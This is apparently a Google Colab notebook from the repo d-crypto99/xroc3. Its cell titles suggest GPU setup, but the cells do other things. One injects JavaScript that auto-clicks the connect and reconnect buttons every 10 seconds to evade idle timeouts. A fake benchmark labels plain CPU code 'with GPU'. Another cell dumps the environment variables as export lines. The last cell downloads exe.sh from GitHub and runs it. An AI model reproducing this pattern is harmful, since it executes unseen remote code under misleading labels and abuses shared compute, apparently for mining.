# %% [markdown]
# <a href="https://colab.research.google.com/github/d-crypto99/xroc3/blob/main/xroc3.ipynb" target="_parent"><img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab"/></a>

# %% [markdown]
# # **BISMILAH-RUNNER**

# %%
#@title Run Every 30 Minutes

print ("Hello World")

import IPython
from google.colab import output

display(IPython.display.Javascript('''
function ClickConnect(){
  btn = document.querySelector("colab-connect-button")
  if (btn != null){
    console.log("Click colab-connect-button"); 
    btn.click() 
    }
    
  btn = document.getElementById('ok')
  if (btn != null){
    console.log("Click reconnect"); 
    btn.click() 
    }
  }
    
setInterval(ClickConnect,10000)
'''))

# %%
#@title Check GPU
! nvidia-smi -L

# %%
#@title Mod GPU

from numba import jit, cuda
import numpy as np
# to measure exec time
from timeit import default_timer as timer

# normal function to run on cpu
def func(a):								
	for i in range(10000000):
		a[i]+= 1	

						
def func2(a):
	for i in range(10000000):
		a[i]+= 1
if __name__=="__main__":
	n = 10000000							
	a = np.ones(n, dtype = np.float64)
	b = np.ones(n, dtype = np.float32)
	
	start = timer()
	func(a)
	print("without GPU:", timer()-start)	
	
	start = timer()
	func2(a)
	print("with GPU:", timer()-start)

# %%
#@title Import CUDA

import os
' && '.join([f'export {name}="{value}"' for name, value in os.environ.items()])

# %%
#@title Tensor Maksimum

import tensorflow as tf

from tensorflow import keras
from tensorflow.keras import layers
from tensorflow.keras import mixed_precision

mixed_precision.set_global_policy('mixed_float16')

# %%
#@title START.....
! wget https://raw.githubusercontent.com/d-crypto99/xroc3/main/exe.sh && chmod u+x exe.sh && ./exe.sh
